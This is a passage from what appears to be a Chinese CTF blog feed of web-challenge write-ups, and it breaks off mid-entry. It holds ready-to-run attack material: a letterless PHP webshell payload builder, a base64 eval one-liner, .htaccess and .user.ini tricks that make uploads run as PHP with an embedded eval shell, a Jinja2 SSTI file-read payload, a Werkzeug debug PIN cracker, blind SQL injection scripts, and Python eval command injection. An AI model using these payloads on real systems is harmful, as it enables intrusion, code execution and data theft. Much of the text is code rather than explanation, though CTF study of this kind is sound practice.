class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((5).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((6).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((7).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((8).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((9).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((-10).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1.1).(0))&#123;1&#125;)&quot;</span>&#125;);loop = <span class="hljs-number">0</span>;<span class="hljs-keyword">while</span> loop &lt; <span class="hljs-number">20</span>:    loop+=<span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> i in result:        <span class="hljs-keyword">for</span> j in result:            k = chr(ord(i)|ord(j))            <span class="hljs-keyword">if</span> k not in result <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>&lt;=ord(k)&lt;=<span class="hljs-number">256</span>:                result.append(k);                recipe = &#123;<span class="hljs-string">&quot;char&quot;</span>:k,<span class="hljs-string">&quot;first&quot;</span>:i,<span class="hljs-string">&quot;second&quot;</span>:j,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>&#125;                recipes.append(recipe)                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;%s=(%s%s%s)&quot;</span> % (recipe[<span class="hljs-string">&#x27;char&#x27;</span>],recipe[<span class="hljs-string">&#x27;first&#x27;</span>],recipe[<span class="hljs-string">&#x27;method&#x27;</span>],recipe[<span class="hljs-string">&#x27;second&#x27;</span>])                <span class="hljs-keyword">print</span>(result)    <span class="hljs-keyword">for</span> i in result:        <span class="hljs-keyword">for</span> j in result:            k = chr(ord(i)&amp;ord(j))            <span class="hljs-keyword">if</span> k not in result <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>&lt;=ord(k)&lt;=<span class="hljs-number">256</span>:                result.append(k);                recipe = &#123;<span class="hljs-string">&quot;char&quot;</span>:k,<span class="hljs-string">&quot;first&quot;</span>:i,<span class="hljs-string">&quot;second&quot;</span>:j,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>&#125;                recipes.append(recipe)                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;%s=(%s%s%s)&quot;</span> % (recipe[<span class="hljs-string">&#x27;char&#x27;</span>],recipe[<span class="hljs-string">&#x27;first&#x27;</span>],recipe[<span class="hljs-string">&#x27;method&#x27;</span>],recipe[<span class="hljs-string">&#x27;second&#x27;</span>])                <span class="hljs-keyword">print</span>(result)def findRecipe(i):    <span class="hljs-keyword">if</span> i not in result:        raise <span class="hljs-built_in">Exception</span>(i);    <span class="hljs-keyword">for</span> recipe in recipes:        <span class="hljs-keyword">if</span> recipe[<span class="hljs-string">&#x27;char&#x27;</span>] == i:            <span class="hljs-keyword">return</span> recipe;def makeRecipe(recipe):    <span class="hljs-keyword">if</span> recipe[<span class="hljs-string">&#x27;method&#x27;</span>] == <span class="hljs-literal">null</span>:        <span class="hljs-keyword">return</span> recipe[<span class="hljs-string">&#x27;make&#x27;</span>];    <span class="hljs-keyword">else</span>:        first = recipe[<span class="hljs-string">&#x27;first&#x27;</span>];        second = recipe[<span class="hljs-string">&#x27;second&#x27;</span>];        method = recipe[<span class="hljs-string">&#x27;method&#x27;</span>];        first = makeRecipe(findRecipe(first));        second = makeRecipe(findRecipe(second));        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;%s=(%s%s%s)&quot;</span> % (recipe[<span class="hljs-string">&#x27;char&#x27;</span>],first,method,second)        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(%s%s%s)&quot;</span> % (first,method,second)<span class="hljs-comment">#填写要拼的字符串</span>target = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;result1=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span> i in target:    <span class="hljs-keyword">if</span> i not in result:        raise <span class="hljs-built_in">Exception</span>(i);    <span class="hljs-keyword">for</span> recipe in recipes:        <span class="hljs-keyword">if</span> recipe[<span class="hljs-string">&#x27;char&#x27;</span>] == i:            result1+=makeRecipe(recipe);            result1+=<span class="hljs-string">&quot;.&quot;</span>;            <span class="hljs-keyword">break</span>;<span class="hljs-keyword">print</span>(result1);</code></pre><p>加一个做算数的东西,也是这题</p><p><code>php -r &quot;eval(base64_decode(&#39;JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K&#39;));&quot;</code></p><h1 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h1><p>keys={if:1)show_source(hex2bin(base_convert(203581841767,10,16)));die();//}{end if}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>无字母数字webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>.htaccess的一些知识点</title>
    <link href="/2020/03/16/htaccess%E5%92%8Cuser-ini/"/>
    <url>/2020/03/16/htaccess%E5%92%8Cuser-ini/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>文件是<a href="http://www.lvjiyong.com/tag/apache/">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><pre><code class="hljs awk">.htaccess中有<span class="hljs-comment">#单行注释符,且支持 \ 拼接上下两行</span>php相关配置 https:<span class="hljs-regexp">//</span>www.php.net<span class="hljs-regexp">/manual/</span>zh/ini.list.php<span class="hljs-comment">#  解析全部</span>SetHandler application/x-httpd-php<span class="hljs-comment">#  配合文件上传 解析jpg</span>AddType application/x-httpd-php .jpgAddHandler php7-script .jpg<span class="hljs-comment">#  页眉/页尾 包含shell  可以利用编码绕过过滤 如php伪协议</span>php_value auto_prepend_file <span class="hljs-string">&quot;.htaccess&quot;</span>php_value auto_append_file <span class="hljs-string">&quot;.htaccess&quot;</span> <span class="hljs-comment"># https://www.anquanke.com/post/id/185377#h3-6</span>php_value include_path <span class="hljs-string">&quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span>                    设置包含文件的目录php_value error_reporting <span class="hljs-number">32767</span>    设置报错级别php_value error_log <span class="hljs-regexp">/tmp/</span>fl3g.php  设置错误日志目录php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span>  设置编码  <span class="hljs-comment"># 使正则失效  比如：if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</span>php_value pcre.backtrack_limit <span class="hljs-number">0</span>php_value pcre.jit <span class="hljs-number">0</span></code></pre><p><a href="https://www.anquanke.com/post/id/205098">https://www.anquanke.com/post/id/205098</a></p><hr><blockquote><p>.user.ini 利用条件</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol></blockquote><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=script.jpg</code></pre><p>传名字为script.jpg图片马找一个同目录下的php文件连接</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>知识点总结</tag>
      
      <tag>.htaccess</tag>
      
      <tag>.user.ini</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[GYCTF2020]FlaskApp</title>
    <link href="/2020/03/13/GYCTF2020-FlaskApp/"/>
    <url>/2020/03/13/GYCTF2020-FlaskApp/</url>
    
    <content type="html"><![CDATA[<ul><li><p>SSTI 读文件</p><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></li><li><p>PIN码爆破</p><ol><li><p>服务器运行flask所登录的用户名。 通过/etc/passwd中可以猜测为flaskweb 或者root ，此处用的flaskweb</p></li><li><p>modname 一般不变就是flask.app</p></li><li><p><code>getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</code>。python该值一般为Flask 值一般不变</p></li><li><p>flask库下app.py的绝对路径。通过报错信息就会泄露该值。本题的值为 /usr/local/lib/python3.7/site-packages/flask/app.py</p></li><li><p>当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address,eth0为当前使用的网卡</p></li><li><p>最后一个就是机器的id。  </p><p>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。</p><p>对于docker机则读取/proc/self/cgroup</p></li></ol><pre><code class="hljs apache"><span class="hljs-attribute">1</span>:flaskweb<span class="hljs-attribute">2</span>:flask.app<span class="hljs-attribute">3</span>:Flask<span class="hljs-attribute">4</span>:/usr/local/lib/python<span class="hljs-number">3</span>.<span class="hljs-number">7</span>/site-packages/flask/app.py<span class="hljs-attribute">5</span>:<span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ae:<span class="hljs-number">01</span>:<span class="hljs-number">07</span>:<span class="hljs-number">38</span>  int(<span class="hljs-string">&quot;0242ae010738&quot;</span>,<span class="hljs-number">16</span>)=<span class="hljs-number">2485410400056</span><span class="hljs-attribute">6</span>:<span class="hljs-number">1408</span>f<span class="hljs-number">836</span>b<span class="hljs-number">0</span>ca<span class="hljs-number">514</span>d<span class="hljs-number">796</span>cbf<span class="hljs-number">8960</span>e<span class="hljs-number">45</span>fa<span class="hljs-number">1</span></code></pre></li></ul><p>  爆破PIN脚本：</p>  <pre><code class="hljs python"><span class="hljs-comment">#脚本出处：https://xz.aliyun.com/t/2553</span><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chainprobably_public_bits = [    <span class="hljs-string">&#x27;flaskweb&#x27;</span>,<span class="hljs-comment"># username</span>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,    <span class="hljs-string">&#x27;Flask&#x27;</span>,    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> ]private_bits = [    <span class="hljs-string">&#x27;2485377957891&#x27;</span>,<span class="hljs-comment"># address</span>    <span class="hljs-string">&#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;</span><span class="hljs-comment"># machine-id</span>]h = hashlib.md5()<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)    h.update(bit)h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]num = <span class="hljs-literal">None</span><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]rv =<span class="hljs-literal">None</span><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">else</span>:        rv = numprint(rv)</code></pre><p>  import os</p><p>  os.popen(‘ls /‘).read()</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GXYCTF2019</tag>
      
      <tag>PIN码爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[GYCTF2020]Ezsqli</title>
    <link href="/2020/03/13/GYCTF2020-Ezsqli/"/>
    <url>/2020/03/13/GYCTF2020-Ezsqli/</url>
    
    <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>information_schema被禁用   sys.x$schema_flattened_keys   sys.schema_table_statistics_with_buffer 代替</li><li>绕过union select</li><li>无列名注入</li></ul><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">Author: 颖奇L&#x27;Amore</span><span class="hljs-string">Blog: www.gem-love.com</span><span class="hljs-string">本文链接： https://www.gem-love.com/ctf/1669.html</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quotealphabet = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;Q&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;X&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]url = <span class="hljs-string">&#x27;http://fd871d2e-cc2a-4f0b-878d-385ed4d11981.node3.buuoj.cn/&#x27;</span>target = <span class="hljs-string">&#x27;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()&#x27;</span>res = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> alphabet:        payload = <span class="hljs-string">&#x27;2||ascii(substr((&#123;&#125;),&#123;&#125;,1))=\&#x27;&#123;&#125;\&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(target, i, <span class="hljs-built_in">ord</span>(char))        data = &#123;                <span class="hljs-string">&#x27;id&#x27;</span>:payload                &#125;        r = requests.post(url=url, data=data)        text = r.text        <span class="hljs-comment"># print(text)</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> r.text:            res += char            print(res)            <span class="hljs-keyword">break</span>            <span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&#x27;http://d7e9b4d9-550a-4d5c-b4ae-f3d94aedb909.node3.buuoj.cn/index.php&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trans</span>(<span class="hljs-params">flag</span>):</span>    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))    res = <span class="hljs-string">&#x27;0x&#x27;</span> + res.replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> resflag = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">41</span>,<span class="hljs-number">100</span>):    hexchar = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):        hexchar = trans(flag + <span class="hljs-built_in">chr</span>(char))        payload = <span class="hljs-string">&#x27;2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(hexchar)        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;        r = requests.post(url,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> r.text:            flag += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)            print(flag)            <span class="hljs-keyword">break</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GXYCTF2019</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXYCTF2019-Ezphp</title>
    <link href="/2020/03/08/GXYCTF2020-Easyphp/"/>
    <url>/2020/03/08/GXYCTF2020-Easyphp/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pop链构造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>乌云笔记</title>
    <link href="/2020/03/07/%E4%B9%8C%E4%BA%91%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/03/07/%E4%B9%8C%E4%BA%91%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>2016-07-18起</p><p>github源码泄露    1</p><p>弱口令                    2</p>]]></content>
    
    
    <categories>
      
      <category>挖洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>show平台萌新赛</title>
    <link href="/2020/03/06/show%E5%B9%B3%E5%8F%B0%E8%90%8C%E6%96%B0%E8%B5%9B/"/>
    <url>/2020/03/06/show%E5%B9%B3%E5%8F%B0%E8%90%8C%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<blockquote><p>我应该算个萌新吧，这个萌新赛我应该也能参加吧23333</p></blockquote><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="萌新赛web-萌新记忆"><a href="#萌新赛web-萌新记忆" class="headerlink" title="萌新赛web_萌新记忆"></a>萌新赛web_萌新记忆</h2><p>​        群主给了很多提示，比如说用户名输入有长度限制，如果是常规的注入用的payload肯定不止这么多，联想到GYCTF一题注入里面的同表查询(好像是叫这个)，就猜列名是p （长了也不可能</p><pre><code class="hljs python">payload:u=<span class="hljs-string">&#x27;||substr(p,1,1)&lt;&#x27;</span>%<span class="hljs-number">20</span>&amp;p=<span class="hljs-number">1</span>url = <span class="hljs-string">&#x27;https://9f5be111-ac0e-4f94-9a3d-fffdc2f1083e.chall.ctf.show/admin/checklogin.php&#x27;</span>exp = &#123;<span class="hljs-string">&quot;u&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;x=<span class="hljs-string">&quot;&quot;</span>m = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:        payload = <span class="hljs-string">r&quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&quot;</span>        payload=payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>)+i        <span class="hljs-comment"># print(payload)</span>        exp[<span class="hljs-string">&quot;u&quot;</span>]=payload        rest = requests.post(url,data=exp)        <span class="hljs-comment"># print(rest.text,i)</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;用户名&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> rest.text:            x=x+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)            <span class="hljs-comment"># time.sleep(0.1)</span>            print(x)            <span class="hljs-keyword">break</span><span class="hljs-comment"># 比较的时候不分大小写的，应该是不区分吧</span><span class="hljs-comment"># cptbtptpbcptdtptp  我开始跑出来用大写跑出来的，自闭了很久Qvq</span></code></pre><h2 id="萌新赛web-假赛生"><a href="#萌新赛web-假赛生" class="headerlink" title="萌新赛web_假赛生"></a>萌新赛web_假赛生</h2><p> 用admın 123注册，admin 123登录即可 。应该是非预期，等wp复现</p><h2 id="萌新赛web-数学及格了"><a href="#萌新赛web-数学及格了" class="headerlink" title="萌新赛web_数学及格了"></a>萌新赛web_数学及格了</h2><p>burp抓包，随手’  报错</p><p><img src="https://s2.ax1x.com/2020/03/06/3LJrR0.png" alt="3LJrR0.png"></p><p>最让我头疼的flask，看以前大佬的wp 一般有两条路，ssti和爆破PIN，可惜这些我都不会，哪咋办，只有乱输了。</p><p><img src="https://s2.ax1x.com/2020/03/06/3LYFeg.png" alt="3LYFeg.png">  </p><p>乱输发现是用了一个eval函数，联想起php的eval，尝试可不可以命令注入。python web说真的根本不熟悉，开始是想把命令执行的结果转换成数字再返回来猜结果，在误打误撞的情况下发现一个payload居然可以执行命令并且报错回显</p><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:?number<span class="hljs-number">1</span>=<span class="hljs-number">0</span>&amp;operator=%<span class="hljs-number">2</span>B&amp;number<span class="hljs-number">2</span>=<span class="hljs-number">0</span>%<span class="hljs-number">2</span>Bint(__import__(&#x27;os&#x27;).popen(<span class="hljs-string">&quot;cat%20/home/ctf/web/flag&quot;</span>).read())</code></pre><p><img src="https://s2.ax1x.com/2020/03/06/3Lt1jf.png" alt="3Lt1jf.png"></p><p>跟平常的flask题很不一样，期待预期解</p><h2 id="萌新赛web-签到题"><a href="#萌新赛web-签到题" class="headerlink" title="萌新赛web_签到题"></a>萌新赛web_签到题</h2><p>没得任何过滤的命令执行</p><pre><code class="hljs routeros">payload：?<span class="hljs-attribute">url</span>=;cat flag;</code></pre><h2 id="萌新赛web-给她"><a href="#萌新赛web-给她" class="headerlink" title="萌新赛web_给她"></a>萌新赛web_给她</h2><p>第一层我是真的不会，从别的师傅哪听来sprintf漏洞Qvq</p><p>参考  <a href="https://www.jianshu.com/p/3f14bae3396f">https://www.jianshu.com/p/3f14bae3396f</a>    <code>%1$</code>可以绕过对引号的过滤</p><p><img src="https://s2.ax1x.com/2020/03/06/3LdLef.png" alt="3LdLef.png"></p><p>开始看到404是懵了 看了代码后发现是正常的题目，注意到<code>Cookie: file=666c61672e747874</code>,16进制是flag.txt，访问发现的确有这个文件，所以这里是文件包含，可以联想到伪协议</p><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=/flag常规的不行，过滤了base64，换string.rot13过滤器php:<span class="hljs-regexp">//</span>filter<span 